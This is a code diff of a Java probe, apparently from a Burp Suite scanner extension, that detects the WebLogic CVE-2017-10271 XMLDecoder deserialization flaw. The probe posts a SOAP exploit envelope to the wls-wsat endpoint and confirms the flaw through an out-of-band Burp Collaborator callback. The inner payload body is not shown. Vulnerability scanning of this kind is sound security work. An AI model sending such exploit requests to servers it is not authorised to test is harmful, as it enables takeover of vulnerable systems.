@@ -2,20 +2,17 @@ package probes;
 
 import burp.*;
 
-import java.util.Base64;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+import java.util.HashMap;
 
 public class CVE_2017_10271 extends Probe {
     private static final String NAME = "CVE-2017-10271";
     private static final String SEVERITY = "High";
-    private static String detail = "WebLogic has a deserialization vulnerability in XMLDecoder, you can send payload to target server via SOAP protocol!";
+    private static final String DESC = "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 7.5 (Availability impacts).";
 
     @Override
     public IScanIssue check(IHttpRequestResponse requestResponse) {
-        String targetPath = "/wls-wsat/CoordinatorPortType";
+        String path = "/wls-wsat/CoordinatorPortType";
         String pollPayload = Utilities.collaborator.generatePayload(true);
-        boolean vulnerable = false;
         String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                          "  <soapenv:Header>\n" +
                          "    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
@@ -37,26 +34,23 @@ public class CVE_2017_10271 extends Probe {
                          "  <soapenv:Body/>\n" +
                          "</soapenv:Envelope>";
 
-        // post request
-        IHttpRequestResponse checkReqResp = sendSOAP(requestResponse, targetPath, payload);
-        String respText = Utilities.helpers.bytesToString(checkReqResp.getResponse());
+        IHttpRequestResponse checkReqResp = postReq(
+                requestResponse.getHttpService(),
+                path,
+                new HashMap<>() {
+                    { put("Content-Type", "text/xml"); }
+                },
+                payload
+        );
 
-        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
-            byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("raw_query").getBytes());
-            if (rawQuery.length > 0) {
-                Utilities.out.println(new String(rawQuery));
-            }
+        String detail = Utilities.fetchInteraction(pollPayload);
 
-            detail = detail + "<br/>"
-                    + "Receive a " + interaction.getProperty("type")
-                    + " query from " + interaction.getProperty("client_ip")
-                    + " at " + interaction.getProperty("time_stamp");
-
-            vulnerable = true;
-        }
-
-        if (vulnerable) {
-            return new WebLogicIssue(checkReqResp, NAME, detail, SEVERITY);
+        if (detail.length() > 0) {
+            return new WebLogicIssue(
+                    checkReqResp,
+                    NAME,
+                    DESC + "<br/><br/>" + detail,
+                    SEVERITY);
         } else return null;
     }
 }
